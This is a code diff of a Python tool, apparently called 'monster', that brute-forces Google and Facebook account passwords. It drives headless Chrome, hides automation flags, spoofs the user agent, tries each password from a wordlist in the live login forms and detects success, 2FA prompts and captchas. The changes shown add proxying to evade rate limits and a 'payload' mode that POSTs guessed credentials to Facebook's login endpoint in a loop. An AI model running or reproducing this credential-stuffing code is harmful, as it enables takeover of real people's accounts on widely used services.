@@ -28,14 +28,34 @@ red_bg = "\033[1;41m"
 green = "\033[1;32m"
   
   
-  
-with open('data/settings.json', 'r') as setting_conf:
-  settings = setting_conf.readlines()
+if os.path.exists('data/settings.json'): 
+  with open('data/settings.json', 'r') as setting_conf:
+    settings = setting_conf.readlines()
+else:
+  os.makedirs('data', exist_ok = True)
+  with open('data/settings.json', 'w') as new_setting:
+    format_ = {
+      "settings": False,
+      "proxy": False,
+      "username": "",
+      "email address": "",
+      "password path": "data/passwords.txt"
+    }
+    json.dump(format_, new_setting, indent = 4)
+    new_setting.close()
+    print(f'{blue}New setting configured... Kindly restart the program{plain}')
+    sys.exit()
     
 def sanitize_json_str(value):
   if value:
     return value.replace(",", "").strip()
-  
+
+def sanitize_json_bool(value):
+  if value != "":
+    if "true" in value:
+      return True
+    return False
+       
 def proxy_status():
   with open('data/settings.json', 'r') as settings:
     setting = settings.readlines()
@@ -47,6 +67,12 @@ def proxy_status():
         
 def open_settings(modify):
     ackn_setting = settings[1].split(':')
+    
+    init_proxy = sanitize_json_bool(settings[2].split(':')[1].strip())
+    init_username = settings[3].split(':')[1].replace(",", "").strip('"').strip().strip('"')
+    init_email = settings[4].split(':')[1].replace(",", "").strip('"').strip().strip('"')
+    init_password_path = settings[5].split(':')[1].replace(",","").strip('"').strip().strip('"')
+    
     if ackn_setting[1] != "false":
       while modify == True:
           
@@ -67,30 +93,26 @@ def open_settings(modify):
           if 'on' in check_proxy.lower():
             new_proxy = input(f'{yellow}Would you like to disable proxy : [Yes | No] : {plain}').lower()
             if new_proxy == 'yes':
-              proxy_setting[1] = False
+              init_proxy = False
             else:
-              proxy_setting[1] = True
+              init_proxy = True
           elif 'off' in check_proxy.lower():
             new_proxy = input(f'{yellow}Would you like to enable proxy : [Yes | No] : {plain}').lower()
             if new_proxy == 'yes':
-              proxy_setting[1] = True
+              init_proxy = True
             else:
-              proxy_setting[1] = False
+              init_proxy = False
               
         elif "2" in like_to:
-          username_setting = settings[3].split(':')
-          current_username = username_setting[1].strip()
-          print(f'Current username : {blue}{current_username}{plain}')
+          print(f'Current username : {blue}{init_username}{plain}')
           change_user = input('Would you like to change your username [Yes | No] : ').strip().lower()
           if change_user in ["y", "yes"]:
             new_username = input('Enter your new username : ')
-            username_setting[1] = new_username
+            init_username = new_username
           else: 
             pass
         elif "3" in like_to:
-          email_setting = settings[4].split(':')
-          current_email = email_setting[1].strip()
-          print(f'Your current email: {blue}{current_email}{plain}')
+          print(f'Your current email: {blue}{init_email}{plain}')
           change_email = input('Would you like to change this [Yes | No] : ').strip().lower()
           if change_email == "yes":
             changing = True
@@ -98,19 +120,21 @@ def open_settings(modify):
               new_email = input('Enter new email address : \n')
               pattern = r"^[a-zA-Z0-9_+.]+@[a-zA-Z0-9_+]+\.[a-z]{2,3}$"
               if re.search(pattern, new_email):
-                email_setting[1] = new_email
+                init_email = new_email
                 changing = False
               else:
                 print(f'\n{red_bg}That wasn\'t an email address!!!{plain}')
           elif change_email == "no":
             pass
         elif "4" in like_to:
-          path_setting, path = settings[5].split(':')
-          pass_holder = f"""
-          Current password file : {path.strip().split('/')[1][:-1]}
-          Your new password file must be located in the data folder
-          """
-          print(f'{blue}{textwrap.dedent(pass_holder)} {plain}')
+          try:
+            pass_holder = f"""
+            Current password file : {init_password_path.strip().split('/')[1]}
+            Your new password file must be located in data folder
+            """
+            print(f'{blue}{textwrap.dedent(pass_holder)} {plain}')
+          except IndexError:
+            print(f'{red}No password file found{plain}')
           changing = True
           while changing:
             change = input('Change your password path [Yes | No] : ').lower()
@@ -127,45 +151,23 @@ def open_settings(modify):
                       print(f'{red}{new_path} is an empty document, try again{plain}')
                     else:
                       content.close()
-                      path_setting = settings[5].split(':')
-                      path_setting[1] = f"data/{new_path}"
+                      init_password_path = f"data/{new_path}"
                       changing = False
               else:
                 print(f'{red}Provide a valid .txt document {plain}')
             else:
               changing = False
         elif "5" in like_to:
-          default_setting = {
+          update_setting = {
           "settings": True,
-          "proxy": settings[2].split(':')[1].strip() == "true",
-          "username":settings[3].split(':')[1].replace(",", "").strip('"').strip().strip('"'),
-          "email address":settings[4].split(':')[1].replace(",", "").strip('"').strip().strip('"'),
-          "password path":settings[5].split(':')[1].replace(",","").strip('"').strip().strip('"')
+          "proxy":init_proxy,
+          "username":init_username,
+          "email address":init_email,
+          "password path":init_password_path
           }
-   
-          try:
-            if proxy_setting[1]:
-              default_setting.update({"proxy":proxy_setting[1]})
-          except UnboundLocalError:
-            pass
-          try:
-            if username_setting[1]:
-              default_setting.update({"username":sanitize_json_str(username_setting[1])})
-          except UnboundLocalError:
-            pass
-          try:
-            if email_setting[1]:
-              default_setting.update({"email address":sanitize_json_str(email_setting[1])})
-          except UnboundLocalError:
-            pass
-          try:
-            if path_setting[1]:
-              default_setting.update({"password path" : sanitize_json_str(path_setting[1])})
-          except UnboundLocalError:
-            pass
-   
+
           with open('data/settings.json', 'w') as setting_con:
-            json.dump(default_setting,setting_con,indent = 4)
+            json.dump(update_setting,setting_con,indent = 4)
             modify = False
             print(f'{blue}𝚁𝚎𝚜𝚝𝚊𝚛𝚝 𝚝𝚑𝚎 𝚙𝚛𝚘𝚐𝚛𝚊𝚖, 𝚃𝚘 𝚞𝚙𝚍𝚊𝚝𝚎 𝚌𝚑𝚊𝚗𝚐𝚎𝚜')
             sys.exit()
@@ -219,7 +221,15 @@ def onload_proxy(data = None, pop = None):
     else:
       set_.close()
       return None
- 
+
+def onload_file(value):
+  new_value = value.strip().strip('"')
+  if not os.path.exists(new_value):
+    return None
+  else:
+    return f'{new_value}'
+  
+  
 def proxy_errorV(errorLogged = None, terminate = None):
   if errorLogged != None:
     if 'net::ERR_SOCKS_CONNECTION_FAILED' in errorLogged:
@@ -229,13 +239,21 @@ def proxy_errorV(errorLogged = None, terminate = None):
       onload_proxy(pop = terminate)
       logging.error(errorLogged)
       print(f'{red}Proxy connection failed{plain}')
+    if 'net::ERR_CONNECTION_REFUSED' in errorLogged:
+      logging.warning(errorLogged)
+      print(f'{yellow}If proxy is enabled...Run "python server.py" before trying again {plain}')
+      
     else:
       print(errorLogged)
       
       
 def main(): 
+  password_file = settings[5].split(':')[1]
   logging.basicConfig(filename='monster.log', format = "%(asctime)s - %(levelname)s - %(message)s")
-        
+  
+  with open(onload_file(password_file), 'r') as file:
+            pass_ = file.readlines()
+            
   holder = rf"""
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    _,  _ _, _ _,_ _  ,   _, _  _, _, _  _, ___ __, __,
@@ -246,9 +264,9 @@ def main():
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜              𝙿𝚛𝚘𝚡𝚢 - {proxy_status()}
    
-   {dp_blue}𝙱𝚛𝚞𝚝𝚎-𝚏𝚘𝚛𝚌𝚎          {yellow} 𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜 
+   {dp_blue}𝙱𝚛𝚞𝚝𝚎-𝚏𝚘𝚛𝚌𝚎           {dp_blue}𝙿𝚊𝚢𝚕𝚘𝚊𝚍
    {green}𝙷𝚝𝚖𝚕 𝚜𝚔𝚒𝚗𝚗𝚎𝚛          {green}𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛
-   {red}𝙴𝚡𝚒𝚝{plain} 
+   {yellow}𝚂𝚎𝚝𝚝𝚒𝚗𝚐𝚜              {red}𝙴𝚡𝚒𝚝{plain} 
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    {blue_bg}𝙶𝚒𝚝𝚑𝚞𝚋 - 𝚜𝚑𝚊𝚍𝚎[𝚑𝚊𝚛𝚔𝚎𝚛𝚋𝚢𝚝𝚎]{plain}  𝚂𝚝𝚊𝚝𝚞𝚜 - {check_connection()}
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -260,6 +278,8 @@ def main():
     print(f'{blue}{textwrap.dedent(holder)}{plain}')
     command = input(f'{yellow}𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒.𝚎 [𝚑𝚝𝚖𝚕 𝚘𝚛 𝚑𝚝𝚖𝚕-𝚜𝚔𝚒𝚗𝚗𝚎𝚛] : {plain}')
     if command.lower() in ['brute', 'brute-force']:
+      temp_disable = input(f'{blue}Temporarily disable proxy for now, [Yes | No] : {plain}').lower()
+      disable_now = True if temp_disable.strip() == "yes" else False
       br = True
       while br:
         target = """
@@ -267,41 +287,38 @@ def main():
         [2] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝙵𝚋-𝚑𝚊𝚌𝚔2.7]
         [3] 𝙴𝚡𝚒𝚝
         
-        𝙽𝚘𝚝 𝚘𝚗 𝚝𝚑𝚎 𝚕𝚒𝚜𝚝? 𝚎𝚗𝚝𝚎𝚛 \"𝚌𝚞𝚜𝚝𝚘𝚖\"
         """
         print(blue+textwrap.dedent(target)+plain)
         options = webdriver.ChromeOptions()
         options.add_argument('--headless=new')
         options.add_argument('--disable-gpu')
         options.add_argument('--no-sandbox')
-        options.add_argument('--disable-dev-shm-usage')
         options.add_argument('--incognito')
         options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
         tar = input(f'{yellow}>>> ').lower()
         if tar in ['google','1']:
-          password_file = settings[4].split(':')[1]
-          with open(password_file, 'r') as file:
-            pass_ = file.readlines()
-          caught_proxy = onload_proxy()
-          if caught_proxy is not None:
-            if '@' in caught_proxy:
-              options.add_argument('--proxy-server=https://127.0.0.1:8000')
-            else:
-              options.add_argument(f'--proxy-server={caught_proxy}')
-     
-            
           options.add_argument("--disable-blink-features=AutomationControlled")
-          driver = webdriver.Chrome(options = options)
-          sign_in_tar = 'https://accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
+          caught_proxy = onload_proxy()
+          if caught_proxy != None and disable_now == False:
+            options.add_argument('--proxy-server=127.0.0.1:8000')
+            sign_in_tar = 'http://127.0.0.1:8000/accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
+          else:
+            sign_in_tar = 'https://accounts.google.com/v3/signin/identifier?dsh=S1812573153%3A1655944654029516&flowEntry=ServiceLogin&flowName=WebLiteSignIn&ifkv=AX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5'
           try:
+            driver = webdriver.Chrome(options = options)
             driver.get(sign_in_tar)
-            email_or_phone = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 >>> {plain}')
             time.sleep(5)
             wait = WebDriverWait(driver, 20)
             page_source = driver.page_source
             page_ = bs(page_source, 'html.parser')
+            if 'Error' in page_.text:
+              print(page_)
+              
             if page_.find_all('form'):
-  
+              email_or_phone = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 >>> {plain}')
+              if email_or_phone.lower() in ['exit']:
+                break
+              
               target_email = driver.find_element(By.CSS_SELECTOR, 'input[name="identifier"]')
               
               target_email.send_keys(email_or_phone)
@@ -318,16 +335,15 @@ def main():
                 target_password.send_keys(check_password)
                 wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
                 driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
-                print(f'Trying password : {check_password}')
+                time.sleep(5) 
                 response_ = bs(driver.page_source, 'html.parser').text
-                time.sleep(5)
                 if "Wrong password" in response_:
-                  print(f'{red}Incorrect password{plain}')
+                  print(f'{red}Incorrect password : {check_password} {plain}')
                 elif "Confirm that you\'re not a robot" in response_:
                   captcha_con = captcha.extend(check_password)
                   print(f'{red}Captcha detected {plain}')
                   if len(captcha) > 5:
-                    print('Sleep time')
+                    print('The server keeps calling me a bot, i should just go to sleep 💤...You should too')
                     driver.quit()
                     break
                 
@@ -353,108 +369,115 @@ def main():
             driver.quit()
           
         if tar in ['facebook','2']:
-          load = ['/', '-', '\\', '|', '/', '-', '\\', '|', '/', '-']
-          l = 0
-          while l < len(load):
-            print(f'\r{plain}𝙻𝚘𝚊𝚍𝚒𝚗𝚐 {green}{load[l]}{plain}', end = '', flush = True)
-            time.sleep(0.3)
-            l += 1
-          password_file = settings[4].split(':')[1]
-          with open(password_file, 'r') as passwords:
-            pass_ = passwords.readlines()
-          
           username_email = input(f'\n{yellow}[𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛] >>> {plain}')
-          method = True
-          while method:
-            print(f'{blue}\n𝙼𝚎𝚝𝚑𝚘𝚍 : 𝚋𝚛𝚞𝚝𝚎(𝚜𝚕𝚘𝚠) 𝚘𝚛 𝚙𝚊𝚢𝚕𝚘𝚊𝚍(𝚏𝚊𝚜𝚝){plain} ')
-            method = input(f'{yellow}𝙳𝚎𝚏𝚊𝚞𝚕𝚝 [𝚋𝚛𝚞𝚝𝚎 => 𝚒𝚏 𝚕𝚎𝚏𝚝 𝚎𝚖𝚙𝚝𝚢] >>> {plain}').lower()
-            if method in ['brute', 'brute-force','']:
-              for i in range(len(pass_)):
-                check_password = pass_[i]
-                caught_proxy = onload_proxy()
-                if caught_proxy is not None:
-                  options.add_argument(f'--proxy-server={caught_proxy}')
+          if username_email.lower() in ['exit']:
+            break
+          
+          for i in range(len(pass_)):
+            check_password = pass_[i]
+            caught_proxy = onload_proxy()
+            if caught_proxy != None and disable_now ==False:
+              options.add_argument('--proxy-server=127.0.0.1:8000')
+              sign_in_face = 'http://127.0.0.1:8000/www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#'
+            else:
+              sign_in_face = 'https://www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#'
+            driver = webdriver.Chrome(options = options)
+            try:
+              driver.get(sign_in_face)
                   
-                driver = webdriver.Chrome(options = options)
-                try:
-                  driver.get('https://www.facebook.com/login.php/?wtsid=rdr_0f3dD3Sv9vasSu1yl&_rdc=2&_rdr#')
+              time.sleep(5)
+              page_ = bs(driver.page_source, 'html.parser').text
+              if r"This site can’t be reached" in page_:
+                print(f'{red}Facebook can\'t be reached at the moment{plain}')
+                driver.quit()
+                break
+                  
+              if r"temporarily blocked" not in page_:
+                if 'Error' in page_:
+                  print(page_)
+                  break
+                      
+                wait = WebDriverWait(driver,30)
+                wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@placeholder="Email address or phone number"]')))
+              
+                username_field = driver.find_element(By.XPATH,
+                '//input[@placeholder="Email address or phone number"]')
+    
+                password_field = driver.find_element(By.XPATH,
+                '//input[@type="password"]')
+              
+                username_field.send_keys(username_email)
+                password_field.send_keys(check_password)
                 
-                  page_ = bs(driver.page_source, 'html.parser').text
-                  if r"This site can’t be reached" in page_:
-                    print(f'{red}Facebook can\'t be reached at the moment{plain}')
+                print(f'\n{green}[{username_email}] 𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}', end = '', flush = True)
+                    
+                wait.until(EC.visibility_of_element_located((By.XPATH, '//button[contains(text(), "Log in")]')))
+                driver.find_element(By.XPATH,'//button[contains(text(), "Log in")]').click()
+                try:
+                    
+                  wait.until(EC.visibility_of_element_located((By.XPATH, '//div[contains(text(), "incorrect")] | //div[contains(text(),  "Check your notifications on another device")]')))
+                  page_content = bs(driver.page_source, 'html.parser').text
+                  if "incorrect" in page_content:
+                    print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}')
+                  elif "Check your notifications on  another device" in page_content:
+                    print(f'{red}Correct password {check_password} [{yellow} might have 2 factor authentication {plain}]')
+                    driver.quit()
+                    break
+                  else:
+                    print(f'{green} {check_password} is the correct password{plain}')
                     driver.quit()
                     break
                   
-                  if r"temporarily blocked" not in page_:
-                    wait = WebDriverWait(driver,20)
-                    wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@placeholder="Email address or phone number"]')))
-              
-                    username_field = driver.find_element(By.XPATH,
-                  '//input[@placeholder="Email address or phone number"]')
-    
-                    password_field = driver.find_element(By.XPATH,
-                  '//input[@type="password"]')
-              
-                    username_field.send_keys(username_email)
-                    password_field.send_keys(check_password)
-                  
-                    print(f'\n{green}[{username_email}] 𝚃𝚛𝚢𝚒𝚗𝚐 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {check_password}{plain}', end = '', flush = True)
+                except selenium.common.exceptions.TimeoutException as sel_timer:
+                  logging.critical(sel_timer)
+                  print(f'{red}Timeout{plain}')
+                  pass
                     
-                    wait.until(EC.visibility_of_element_located((By.XPATH, '//button[contains(text(), "Log in")]')))
-                    driver.find_element(By.XPATH,'//button[contains(text(), "Log in")]').click()
-                    try:
-                    
-                      wait.until(EC.visibility_of_element_located((By.XPATH, '//div[contains(text(), "incorrect")] | //div[contains(text(),  "Check your notifications on another device")]')))
-                      page_content = bs(driver.page_source, 'html.parser').text
-                      if "incorrect" in page_content:
-                        print(f'{red}𝙸𝚗𝚌𝚘𝚛𝚛𝚎𝚌𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍{plain}')
-                      elif "Check your notifications on  another device" in page_content:
-                        print(f'{red}Correct password : {check_password} [{yellow} might have 2 factor authentication {plain}]')
-                        driver.quit()
-                        break
-                      else:
-                        print(f'{green} {check_password} is the correct password{plain}')
-                        driver.quit()
-                        break
-                        
-                  
-                    except selenium.common.exceptions.TimeoutException as sel_timer:
-                      logging.critical(sel_timer)
-                      pass
-                      print(f'{red}Timeout{plain}')
-                    except selenium.common.exceptions.NoSuchElementException as sel_err:
-                      logging.error(sel_err)
-                      print(f'{red}Skip{plain}')
-                  else:
-                    print(f'{red}Requests have been temporarily blocked{plain}')
+                except selenium.common.exceptions.NoSuchElementException as sel_err:
+                  logging.error(sel_err)
+                  print(f'{red}Skip{plain}')
+              else:
+                print(f'{red}Requests have been temporarily blocked{plain}')
                
-                except Exception:
-                  track = traceback.format_exc()
-                  proxy_errorV(errorLogged = track, terminate = caught_proxy)
+            except Exception:
+              track = traceback.format_exc()
+              proxy_errorV(errorLogged = track, terminate = caught_proxy)
+              break
             
-              driver.quit()
-            elif method == 'payload':
-              target_url = 'https://facebook.com/login.php'
-              i = 0
-              while i < len(pass_):
-                check_password = pass_[i]
-                caught_proxy = onload_proxy(data = dict)
-                response = requests.get(target_url, proxies = caught_proxy)
-                cookies = {i.name : i.value for i in response.cookies}
-                target_ = bs(response.text, 'html.parser')
-                form = target_.find_all('form')
-                if form:
-                  data = {'name':f'{username_email}', 'pass':f'{check_password}'}
-                  data_sent = requests.post(target_url, data = data, cookies = cookies, proxies = caught_proxy)
-          
-                  print(f'{yellow}Trying password : {check_password}')
-                  if 'Find friends' in data_sent.text or 'Check your notifications on another device' in data_sent.text or 'authentication' in data_sent.text:
-                    print(f'{green}[{username_email}] Password found : {check_password}')
-                    break
-                i += 1
-          
+          driver.quit()
         elif tar in ['exit','3']:
           br = False
+    elif command.lower() == 'payload':
+      holder = """\n
+      𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚝𝚎𝚖𝚙𝚕𝚊𝚝𝚎𝚜
+      [1] 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔
+      
+      𝙲𝚞𝚛𝚛𝚎𝚗𝚝  :- 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔
+      """
+      print(blue+textwrap.dedent(holder)+plain)
+      username_email = input(f'{yellow}𝙴𝚖𝚊𝚒𝚕 𝚊𝚍𝚍𝚛𝚎𝚜𝚜 𝚘𝚛 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 >>> {plain}')
+      if username_email.lower() in ['exit']:
+        break
+      
+      target_url = 'https://facebook.com/login.php'
+      i = 0
+      while i < len(pass_):
+        check_password = pass_[i]
+        caught_proxy = onload_proxy(data = dict)
+        response = requests.get(target_url, proxies = caught_proxy)
+        cookies = {i.name : i.value for i in response.cookies}
+        target_ = bs(response.text, 'html.parser')
+        form = target_.find_all('form')
+        if form:
+          data = {'name':f'{username_email}', 'pass':f'{check_password}'}
+          data_sent = requests.post(target_url, data = data, cookies = cookies, proxies = caught_proxy)
+          
+          print(f'{green}[{username_email}] Trying password : {check_password}')
+          if 'Find friends' in data_sent.text or 'Check your notifications on another device' in data_sent.text or 'authentication' in data_sent.text:
+            print(f'{green}[{username_email}] Password found : {check_password}')
+            break
+          
+        i += 1
     elif command.lower() in ['html-skinner', 'html']:
       skinning = True
       while skinning:
